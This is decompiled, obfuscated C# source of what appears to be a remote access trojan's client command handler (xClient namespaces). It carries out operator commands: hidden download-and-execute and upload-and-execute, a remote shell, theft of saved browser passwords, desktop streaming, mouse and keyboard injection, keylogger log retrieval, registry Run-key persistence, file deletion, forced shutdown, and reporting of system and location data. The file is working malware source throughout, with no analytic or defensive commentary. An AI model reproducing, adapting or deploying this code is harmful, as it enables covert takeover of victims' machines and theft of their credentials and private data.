using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Recovery.Browsers;
using xClient.Core.Utilities;

// Token: 0x02000031 RID: 49
public static class GClass17
{
	// Token: 0x06000161 RID: 353 RVA: 0x00009074 File Offset: 0x00007274
	public static void smethod_0(GetAuthentication command, Client client)
	{
		GClass34.smethod_0();
		new GetAuthenticationResponse(GClass35.string_0, GClass8.FullName, GClass3.smethod_1(), GClass34.GeoInfo.country, GClass34.GeoInfo.country_code, GClass34.GeoInfo.region, GClass34.GeoInfo.city, GClass34.ImageIndex, GClass11.HardwareId, GClass3.smethod_0(), GClass12.smethod_1(), GClass35.string_9).Execute(client);
		if (GClass0.AddToStartupFailed)
		{
			Thread.Sleep(2000);
			new SetStatus("Adding to startup failed.").Execute(client);
		}
	}

	// Token: 0x06000162 RID: 354 RVA: 0x00009104 File Offset: 0x00007304
	public static void smethod_1(DoClientUpdate command, Client client)
	{
		GClass17.Class0 @class = new GClass17.Class0();
		@class.doClientUpdate_0 = command;
		@class.client_0 = client;
		if (string.IsNullOrEmpty(@class.doClientUpdate_0.DownloadURL))
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @class.doClientUpdate_0.FileName);
			try
			{
				if (@class.doClientUpdate_0.CurrentBlock == 0 && @class.doClientUpdate_0.Block[0] != 77 && @class.doClientUpdate_0.Block[1] != 90)
				{
					throw new Exception("No executable file");
				}
				GClass23 gclass = new GClass23(text);
				if (!gclass.method_2(@class.doClientUpdate_0.Block, @class.doClientUpdate_0.CurrentBlock))
				{
					new SetStatus(string.Format("Writing failed: {0}", gclass.LastError)).Execute(@class.client_0);
				}
				else if (@class.doClientUpdate_0.CurrentBlock + 1 == @class.doClientUpdate_0.MaxBlocks)
				{
					new SetStatus("Updating...").Execute(@class.client_0);
					GClass15.smethod_0(@class.client_0, text);
				}
			}
			catch (Exception ex)
			{
				GClass26.DeleteFile(text);
				new SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(@class.client_0);
			}
			return;
		}
		new Thread(new ThreadStart(@class.method_0)).Start();
	}

	// Token: 0x06000163 RID: 355 RVA: 0x00002AB9 File Offset: 0x00000CB9
	public static void smethod_2(DoClientUninstall command, Client client)
	{
		new SetStatus("Uninstalling... bye ;(").Execute(client);
		GClass14.smethod_0(client);
	}

	// Token: 0x06000164 RID: 356 RVA: 0x00009264 File Offset: 0x00007464
	public static void smethod_3(GetDirectory command, Client client)
	{
		GClass17.Class1 @class = new GClass17.Class1();
		@class.bool_0 = false;
		@class.string_0 = null;
		Action<string> action = new Action<string>(@class.method_0);
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(command.RemotePath);
			FileInfo[] files = directoryInfo.GetFiles();
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			string[] array = new string[files.Length];
			long[] array2 = new long[files.Length];
			string[] array3 = new string[directories.Length];
			int num = 0;
			foreach (FileInfo fileInfo in files)
			{
				array[num] = fileInfo.Name;
				array2[num] = fileInfo.Length;
				num++;
			}
			if (array.Length == 0)
			{
				array = new string[]
				{
					"$E$"
				};
				long[] array5 = new long[1];
				array2 = array5;
			}
			num = 0;
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				array3[num] = directoryInfo2.Name;
				num++;
			}
			if (array3.Length == 0)
			{
				array3 = new string[]
				{
					"$E$"
				};
			}
			new GetDirectoryResponse(array, array3, array2).Execute(client);
		}
		catch (UnauthorizedAccessException)
		{
			action("GetDirectory No permission");
		}
		catch (SecurityException)
		{
			action("GetDirectory No permission");
		}
		catch (PathTooLongException)
		{
			action("GetDirectory Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("GetDirectory Directory not found");
		}
		catch (FileNotFoundException)
		{
			action("GetDirectory File not found");
		}
		catch (IOException)
		{
			action("GetDirectory I/O error");
		}
		catch (Exception)
		{
			action("GetDirectory Failed");
		}
		finally
		{
			if (@class.bool_0 && !string.IsNullOrEmpty(@class.string_0))
			{
				new SetStatusFileManager(@class.string_0, true).Execute(client);
			}
		}
	}

	// Token: 0x06000165 RID: 357 RVA: 0x000094E8 File Offset: 0x000076E8
	public static void smethod_4(DoDownloadFile command, Client client)
	{
		GClass17.Class2 @class = new GClass17.Class2();
		@class.doDownloadFile_0 = command;
		@class.client_0 = client;
		new Thread(new ThreadStart(@class.method_0)).Start();
	}

	// Token: 0x06000166 RID: 358 RVA: 0x00009520 File Offset: 0x00007720
	public static void smethod_5(DoDownloadFileCancel command, Client client)
	{
		if (!GClass17.dictionary_0.ContainsKey(command.ID))
		{
			GClass17.dictionary_0.Add(command.ID, "canceled");
			new DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
		}
	}

	// Token: 0x06000167 RID: 359 RVA: 0x00009578 File Offset: 0x00007778
	public static void smethod_6(DoUploadFile command, Client client)
	{
		if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
		{
			GClass26.DeleteFile(command.RemotePath);
		}
		GClass23 gclass = new GClass23(command.RemotePath);
		gclass.method_2(command.Block, command.CurrentBlock);
	}

	// Token: 0x06000168 RID: 360 RVA: 0x000095C8 File Offset: 0x000077C8
	public static void smethod_7(DoPathDelete command, Client client)
	{
		GClass17.Class3 @class = new GClass17.Class3();
		@class.bool_0 = false;
		@class.string_0 = null;
		Action<string> action = new Action<string>(@class.method_0);
		try
		{
			switch (command.PathType)
			{
			case GEnum1.const_0:
				File.Delete(command.Path);
				new SetStatusFileManager("Deleted file", false).Execute(client);
				break;
			case GEnum1.const_1:
				Directory.Delete(command.Path, true);
				new SetStatusFileManager("Deleted directory", false).Execute(client);
				break;
			}
			GClass17.smethod_3(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("DeletePath No permission");
		}
		catch (PathTooLongException)
		{
			action("DeletePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("DeletePath Path not found");
		}
		catch (IOException)
		{
			action("DeletePath I/O error");
		}
		catch (Exception)
		{
			action("DeletePath Failed");
		}
		finally
		{
			if (@class.bool_0 && !string.IsNullOrEmpty(@class.string_0))
			{
				new SetStatusFileManager(@class.string_0, false).Execute(client);
			}
		}
	}

	// Token: 0x06000169 RID: 361 RVA: 0x0000971C File Offset: 0x0000791C
	public static void smethod_8(DoPathRename command, Client client)
	{
		GClass17.Class4 @class = new GClass17.Class4();
		@class.bool_0 = false;
		@class.string_0 = null;
		Action<string> action = new Action<string>(@class.method_0);
		try
		{
			switch (command.PathType)
			{
			case GEnum1.const_0:
				File.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed file", false).Execute(client);
				break;
			case GEnum1.const_1:
				Directory.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed directory", false).Execute(client);
				break;
			}
			GClass17.smethod_3(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("RenamePath No permission");
		}
		catch (PathTooLongException)
		{
			action("RenamePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("RenamePath Path not found");
		}
		catch (IOException)
		{
			action("RenamePath I/O error");
		}
		catch (Exception)
		{
			action("RenamePath Failed");
		}
		finally
		{
			if (@class.bool_0 && !string.IsNullOrEmpty(@class.string_0))
			{
				new SetStatusFileManager(@class.string_0, false).Execute(client);
			}
		}
	}

	// Token: 0x0600016A RID: 362 RVA: 0x0000987C File Offset: 0x00007A7C
	public static void smethod_9(DoDownloadAndExecute command, Client client)
	{
		GClass17.Class5 @class = new GClass17.Class5();
		@class.doDownloadAndExecute_0 = command;
		@class.client_0 = client;
		new SetStatus("Downloading file...").Execute(@class.client_0);
		new Thread(new ThreadStart(@class.method_0)).Start();
	}

	// Token: 0x0600016B RID: 363 RVA: 0x000098C8 File Offset: 0x00007AC8
	public static void smethod_10(DoUploadAndExecute command, Client client)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
		try
		{
			if (command.CurrentBlock == 0 && Path.GetExtension(command.FileName) == ".exe" && !GClass4.smethod_1(command.Block))
			{
				throw new Exception("No executable file");
			}
			GClass23 gclass = new GClass23(text);
			if (!gclass.method_2(command.Block, command.CurrentBlock))
			{
				new SetStatus(string.Format("Writing failed: {0}", gclass.LastError)).Execute(client);
			}
			else if (command.CurrentBlock + 1 == command.MaxBlocks)
			{
				GClass4.smethod_2(text);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = command.RunHidden;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
				new SetStatus("Executed File!").Execute(client);
			}
		}
		catch (Exception ex)
		{
			GClass26.DeleteFile(text);
			new SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
		}
	}

	// Token: 0x0600016C RID: 364 RVA: 0x000099F0 File Offset: 0x00007BF0
	public static void smethod_11(DoVisitWebsite command, Client client)
	{
		string text = command.URL;
		if (!text.StartsWith("http"))
		{
			text = "http://" + text;
		}
		if (Uri.IsWellFormedUriString(text, UriKind.RelativeOrAbsolute))
		{
			if (!command.Hidden)
			{
				Process.Start(text);
			}
			else
			{
				try
				{
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
					httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
					httpWebRequest.AllowAutoRedirect = true;
					httpWebRequest.Timeout = 10000;
					httpWebRequest.Method = "GET";
					using ((HttpWebResponse)httpWebRequest.GetResponse())
					{
					}
				}
				catch
				{
				}
			}
			new SetStatus("Visited Website").Execute(client);
		}
	}

	// Token: 0x0600016D RID: 365 RVA: 0x00009AB4 File Offset: 0x00007CB4
	public static void smethod_12(DoShowMessageBox command, Client client)
	{
		GClass17.Class6 @class = new GClass17.Class6();
		@class.doShowMessageBox_0 = command;
		new Thread(new ThreadStart(@class.method_0)).Start();
		new SetStatus("Showed Messagebox").Execute(client);
	}

	// Token: 0x0600016E RID: 366 RVA: 0x00009AF4 File Offset: 0x00007CF4
	public static void smethod_13(GetPasswords packet, Client client)
	{
		List<GClass32> list = new List<GClass32>();
		list.AddRange(Chrome.GetSavedPasswords());
		list.AddRange(Opera.GetSavedPasswords());
		list.AddRange(Yandex.GetSavedPasswords());
		list.AddRange(InternetExplorer.GetSavedPasswords());
		list.AddRange(Firefox.GetSavedPasswords());
		list.AddRange(GClass21.smethod_0());
		list.AddRange(GClass22.smethod_0());
		List<string> list2 = new List<string>();
		foreach (GClass32 gclass in list)
		{
			string item = string.Format("{0}{4}{1}{4}{2}{4}{3}", new object[]
			{
				gclass.Username,
				gclass.Password,
				gclass.URL,
				gclass.Application,
				"$E$"
			});
			list2.Add(item);
		}
		new GetPasswordsResponse(list2).Execute(client);
	}

	// Token: 0x0600016F RID: 367 RVA: 0x00009BF0 File Offset: 0x00007DF0
	public static void smethod_14(GetDesktop command, Client client)
	{
		string text = GClass5.smethod_2(GClass10.smethod_1(command.Monitor));
		if (GClass17.unsafeStreamCodec_0 == null)
		{
			GClass17.unsafeStreamCodec_0 = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		if (GClass17.unsafeStreamCodec_0.ImageQuality != command.Quality || GClass17.unsafeStreamCodec_0.Monitor != command.Monitor || GClass17.unsafeStreamCodec_0.Resolution != text)
		{
			if (GClass17.unsafeStreamCodec_0 != null)
			{
				GClass17.unsafeStreamCodec_0.Dispose();
			}
			GClass17.unsafeStreamCodec_0 = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		BitmapData bitmapData = null;
		Bitmap bitmap = null;
		try
		{
			bitmap = GClass10.smethod_0(command.Monitor);
			bitmapData = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
			using (MemoryStream memoryStream = new MemoryStream())
			{
				if (GClass17.unsafeStreamCodec_0 == null)
				{
					throw new Exception("StreamCodec can not be null.");
				}
				GClass17.unsafeStreamCodec_0.CodeImage(bitmapData.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, memoryStream);
				new GetDesktopResponse(memoryStream.ToArray(), GClass17.unsafeStreamCodec_0.ImageQuality, GClass17.unsafeStreamCodec_0.Monitor, GClass17.unsafeStreamCodec_0.Resolution).Execute(client);
			}
		}
		catch (Exception)
		{
			if (GClass17.unsafeStreamCodec_0 != null)
			{
				new GetDesktopResponse(null, GClass17.unsafeStreamCodec_0.ImageQuality, GClass17.unsafeStreamCodec_0.Monitor, GClass17.unsafeStreamCodec_0.Resolution).Execute(client);
			}
			GClass17.unsafeStreamCodec_0 = null;
		}
		finally
		{
			if (bitmap != null)
			{
				if (bitmapData != null)
				{
					try
					{
						bitmap.UnlockBits(bitmapData);
					}
					catch
					{
					}
				}
				bitmap.Dispose();
			}
		}
	}

	// Token: 0x06000170 RID: 368 RVA: 0x00009DD4 File Offset: 0x00007FD4
	public static void smethod_15(DoMouseEvent command, Client client)
	{
		try
		{
			Screen[] allScreens = Screen.AllScreens;
			int x = allScreens[command.MonitorIndex].Bounds.X;
			int y = allScreens[command.MonitorIndex].Bounds.Y;
			Point p = new Point(command.X + x, command.Y + y);
			switch (command.Action)
			{
			case GEnum0.const_0:
			case GEnum0.const_1:
				GClass7.smethod_1(p, command.IsMouseDown);
				break;
			case GEnum0.const_2:
			case GEnum0.const_3:
				GClass7.smethod_2(p, command.IsMouseDown);
				break;
			case GEnum0.const_4:
				GClass7.smethod_3(p);
				break;
			case GEnum0.const_5:
				GClass7.smethod_4(p, false);
				break;
			case GEnum0.const_6:
				GClass7.smethod_4(p, true);
				break;
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000171 RID: 369 RVA: 0x00002AD1 File Offset: 0x00000CD1
	public static void smethod_16(DoKeyboardEvent command, Client client)
	{
		GClass7.smethod_5(command.Key, command.KeyDown);
	}

	// Token: 0x06000172 RID: 370 RVA: 0x00002AE4 File Offset: 0x00000CE4
	public static void smethod_17(GetMonitors command, Client client)
	{
		if (Screen.AllScreens.Length > 0)
		{
			new GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
		}
	}

	// Token: 0x06000173 RID: 371 RVA: 0x00009EA4 File Offset: 0x000080A4
	public static void smethod_18(GetKeyloggerLogs command, Client client)
	{
		GClass17.Class7 @class = new GClass17.Class7();
		@class.client_0 = client;
		new Thread(new ThreadStart(@class.method_0)).Start();
	}

	// Token: 0x06000174 RID: 372 RVA: 0x00009ED4 File Offset: 0x000080D4
	public static void smethod_19(GetDrives command, Client client)
	{
		DriveInfo[] array;
		try
		{
			IEnumerable<DriveInfo> drives = DriveInfo.GetDrives();
			if (GClass17.func_0 == null)
			{
				GClass17.func_0 = new Func<DriveInfo, bool>(GClass17.smethod_30);
			}
			array = drives.Where(GClass17.func_0).ToArray<DriveInfo>();
		}
		catch (IOException)
		{
			new SetStatusFileManager("GetDrives I/O error", false).Execute(client);
			return;
		}
		catch (UnauthorizedAccessException)
		{
			new SetStatusFileManager("GetDrives No permission", false).Execute(client);
			return;
		}
		if (array.Length != 0)
		{
			string[] array2 = new string[array.Length];
			string[] array3 = new string[array.Length];
			int i = 0;
			while (i < array.Length)
			{
				string text = null;
				try
				{
					text = array[i].VolumeLabel;
					goto IL_138;
				}
				catch
				{
					goto IL_138;
				}
				goto IL_A3;
				IL_11F:
				array3[i] = array[i].RootDirectory.FullName;
				i++;
				continue;
				IL_A3:
				array2[i] = string.Format("{0} [{1}, {2}]", array[i].RootDirectory.FullName, GClass5.smethod_1(array[i].DriveType), array[i].DriveFormat);
				goto IL_11F;
				IL_138:
				if (string.IsNullOrEmpty(text))
				{
					goto IL_A3;
				}
				array2[i] = string.Format("{0} ({1}) [{2}, {3}]", new object[]
				{
					array[i].RootDirectory.FullName,
					text,
					GClass5.smethod_1(array[i].DriveType),
					array[i].DriveFormat
				});
				goto IL_11F;
			}
			new GetDrivesResponse(array2, array3).Execute(client);
			return;
		}
		new SetStatusFileManager("GetDrives No drives", false).Execute(client);
	}

	// Token: 0x06000175 RID: 373 RVA: 0x0000A05C File Offset: 0x0000825C
	public static void smethod_20(DoShutdownAction command, Client client)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			switch (command.Action)
			{
			case GEnum2.const_0:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/s /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case GEnum2.const_1:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/r /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case GEnum2.const_2:
				Application.SetSuspendState(PowerState.Suspend, true, true);
				break;
			}
		}
		catch (Exception ex)
		{
			new SetStatus(string.Format("Action failed: {0}", ex.Message)).Execute(client);
		}
	}

	// Token: 0x06000176 RID: 374 RVA: 0x0000A12C File Offset: 0x0000832C
	public static void smethod_21(GetStartupItems command, Client client)
	{
		try
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = GClass9.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey != null)
				{
					List<string> list2 = list;
					IEnumerable<string> source = registryKey.smethod_4();
					if (GClass17.func_1 == null)
					{
						GClass17.func_1 = new Func<string, string>(GClass17.smethod_31);
					}
					list2.AddRange(source.Select(GClass17.func_1));
				}
			}
			using (RegistryKey registryKey2 = GClass9.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey2 != null)
				{
					List<string> list3 = list;
					IEnumerable<string> source2 = registryKey2.smethod_4();
					if (GClass17.func_2 == null)
					{
						GClass17.func_2 = new Func<string, string>(GClass17.smethod_32);
					}
					list3.AddRange(source2.Select(GClass17.func_2));
				}
			}
			using (RegistryKey registryKey3 = GClass9.smethod_1(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey3 != null)
				{
					List<string> list4 = list;
					IEnumerable<string> source3 = registryKey3.smethod_4();
					if (GClass17.func_3 == null)
					{
						GClass17.func_3 = new Func<string, string>(GClass17.smethod_33);
					}
					list4.AddRange(source3.Select(GClass17.func_3));
				}
			}
			using (RegistryKey registryKey4 = GClass9.smethod_1(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey4 != null)
				{
					List<string> list5 = list;
					IEnumerable<string> source4 = registryKey4.smethod_4();
					if (GClass17.func_4 == null)
					{
						GClass17.func_4 = new Func<string, string>(GClass17.smethod_34);
					}
					list5.AddRange(source4.Select(GClass17.func_4));
				}
			}
			if (GClass8.Is64Bit)
			{
				using (RegistryKey registryKey5 = GClass9.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (registryKey5 != null)
					{
						List<string> list6 = list;
						IEnumerable<string> source5 = registryKey5.smethod_4();
						if (GClass17.func_5 == null)
						{
							GClass17.func_5 = new Func<string, string>(GClass17.smethod_35);
						}
						list6.AddRange(source5.Select(GClass17.func_5));
					}
				}
				using (RegistryKey registryKey6 = GClass9.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
				{
					if (registryKey6 != null)
					{
						List<string> list7 = list;
						IEnumerable<string> source6 = registryKey6.smethod_4();
						if (GClass17.func_6 == null)
						{
							GClass17.func_6 = new Func<string, string>(GClass17.smethod_36);
						}
						list7.AddRange(source6.Select(GClass17.func_6));
					}
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
			{
				FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
				List<string> list8 = list;
				IEnumerable<FileInfo> source7 = files;
				if (GClass17.func_7 == null)
				{
					GClass17.func_7 = new Func<FileInfo, bool>(GClass17.smethod_37);
				}
				IEnumerable<FileInfo> source8 = source7.Where(GClass17.func_7);
				if (GClass17.func_8 == null)
				{
					GClass17.func_8 = new Func<FileInfo, string>(GClass17.smethod_38);
				}
				IEnumerable<string> source9 = source8.Select(GClass17.func_8);
				if (GClass17.func_9 == null)
				{
					GClass17.func_9 = new Func<string, string>(GClass17.smethod_39);
				}
				list8.AddRange(source9.Select(GClass17.func_9));
			}
			new GetStartupItemsResponse(list).Execute(client);
		}
		catch (Exception ex)
		{
			new SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
		}
	}

	// Token: 0x06000177 RID: 375 RVA: 0x0000A490 File Offset: 0x00008690
	public static void smethod_22(DoStartupItemAdd command, Client client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!GClass9.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 1:
				if (!GClass9.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 2:
				if (!GClass9.smethod_0(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 3:
				if (!GClass9.smethod_0(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 4:
				if (!GClass8.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass9.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 5:
				if (!GClass8.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass9.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 6:
			{
				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				}
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url");
				using (StreamWriter streamWriter = new StreamWriter(path, false))
				{
					streamWriter.WriteLine("[InternetShortcut]");
					streamWriter.WriteLine("URL=file:///" + command.Path);
					streamWriter.WriteLine("IconIndex=0");
					streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
					streamWriter.Flush();
				}
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
		}
	}

	// Token: 0x06000178 RID: 376 RVA: 0x0000A6E8 File Offset: 0x000088E8
	public static void smethod_23(DoStartupItemRemove command, Client client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!GClass9.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 1:
				if (!GClass9.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 2:
				if (!GClass9.smethod_2(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 3:
				if (!GClass9.smethod_2(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 4:
				if (!GClass8.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass9.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 5:
				if (!GClass8.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass9.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 6:
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
				if (!File.Exists(path))
				{
					throw new IOException("File does not exist");
				}
				File.Delete(path);
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
		}
	}

	// Token: 0x06000179 RID: 377 RVA: 0x0000A888 File Offset: 0x00008A88
	public static void smethod_24(GetSystemInfo command, Client client)
	{
		try
		{
			string[] systeminfos = new string[]
			{
				"Processor (CPU)",
				GClass11.smethod_2(),
				"Memory (RAM)",
				string.Format("{0} MB", GClass11.smethod_3()),
				"Video Card (GPU)",
				GClass11.smethod_4(),
				"Username",
				GClass3.smethod_0(),
				"PC Name",
				GClass12.smethod_1(),
				"Uptime",
				GClass12.smethod_0(),
				"MAC Address",
				GClass11.smethod_6(),
				"LAN IP Address",
				GClass11.smethod_5(),
				"WAN IP Address",
				GClass34.GeoInfo.ip,
				"Antivirus",
				GClass12.smethod_2(),
				"Firewall",
				GClass12.smethod_3()
			};
			new GetSystemInfoResponse(systeminfos).Execute(client);
		}
		catch
		{
		}
	}

	// Token: 0x0600017A RID: 378 RVA: 0x0000A994 File Offset: 0x00008B94
	public static void smethod_25(GetProcesses command, Client client)
	{
		Process[] processes = Process.GetProcesses();
		string[] array = new string[processes.Length];
		int[] array2 = new int[processes.Length];
		string[] array3 = new string[processes.Length];
		int num = 0;
		foreach (Process process in processes)
		{
			array[num] = process.ProcessName + ".exe";
			array2[num] = process.Id;
			array3[num] = process.MainWindowTitle;
			num++;
		}
		new GetProcessesResponse(array, array2, array3).Execute(client);
	}

	// Token: 0x0600017B RID: 379 RVA: 0x0000AA24 File Offset: 0x00008C24
	public static void smethod_26(DoProcessStart command, Client client)
	{
		if (string.IsNullOrEmpty(command.Processname))
		{
			new SetStatus("Process could not be started!").Execute(client);
			return;
		}
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				UseShellExecute = true,
				FileName = command.Processname
			};
			Process.Start(startInfo);
		}
		catch
		{
			new SetStatus("Process could not be started!").Execute(client);
		}
		finally
		{
			GClass17.smethod_25(new GetProcesses(), client);
		}
	}

	// Token: 0x0600017C RID: 380 RVA: 0x0000AAB0 File Offset: 0x00008CB0
	public static void smethod_27(DoProcessKill command, Client client)
	{
		try
		{
			Process.GetProcessById(command.PID).Kill();
		}
		catch
		{
		}
		finally
		{
			GClass17.smethod_25(new GetProcesses(), client);
		}
	}

	// Token: 0x0600017D RID: 381 RVA: 0x0000AAFC File Offset: 0x00008CFC
	public static void smethod_28(DoShellExecute command, Client client)
	{
		string command2 = command.Command;
		if (GClass17.shell_0 == null && command2 == "exit")
		{
			return;
		}
		if (GClass17.shell_0 == null)
		{
			GClass17.shell_0 = new Shell();
		}
		if (command2 == "exit")
		{
			GClass17.smethod_29();
			return;
		}
		GClass17.shell_0.ExecuteCommand(command2);
	}

	// Token: 0x0600017E RID: 382 RVA: 0x00002B02 File Offset: 0x00000D02
	public static void smethod_29()
	{
		if (GClass17.shell_0 != null)
		{
			GClass17.shell_0.Dispose();
		}
	}

	// Token: 0x0600017F RID: 383 RVA: 0x00002B15 File Offset: 0x00000D15
	[CompilerGenerated]
	private static bool smethod_30(DriveInfo d)
	{
		return d.IsReady;
	}

	// Token: 0x06000180 RID: 384 RVA: 0x00002B1D File Offset: 0x00000D1D
	[CompilerGenerated]
	private static string smethod_31(string formattedKeyValue)
	{
		return "0" + formattedKeyValue;
	}

	// Token: 0x06000181 RID: 385 RVA: 0x00002B2A File Offset: 0x00000D2A
	[CompilerGenerated]
	private static string smethod_32(string formattedKeyValue)
	{
		return "1" + formattedKeyValue;
	}

	// Token: 0x06000182 RID: 386 RVA: 0x00002B37 File Offset: 0x00000D37
	[CompilerGenerated]
	private static string smethod_33(string formattedKeyValue)
	{
		return "2" + formattedKeyValue;
	}

	// Token: 0x06000183 RID: 387 RVA: 0x00002B44 File Offset: 0x00000D44
	[CompilerGenerated]
	private static string smethod_34(string formattedKeyValue)
	{
		return "3" + formattedKeyValue;
	}

